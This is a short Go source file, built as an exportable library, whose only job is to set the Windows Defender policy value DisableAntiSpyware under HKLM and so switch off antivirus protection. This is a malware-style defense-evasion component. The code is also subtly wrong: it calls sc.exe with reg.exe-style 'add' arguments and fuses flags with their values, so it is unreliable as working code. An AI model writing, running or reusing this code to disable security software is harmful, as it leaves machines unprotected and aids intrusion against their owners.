package main

import (
	"C"
	"log"
	"os/exec"
	"time"
)

//export Entry
func Entry() {
	main()
}

//export main
func main() {
	//Create a key to stop the service
	println("Stopping the service")
	cmd1 := exec.Command("sc.exe",
		"add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v DisableAntiSpyware", "/t REG_DWORD", "/d 1", "/f")
	err1 := cmd1.Run()

	if err1 != nil {
		log.Fatal(err1)
	}

	//Final sleep for debugging purpose
	time.Sleep(3 * time.Second)
}
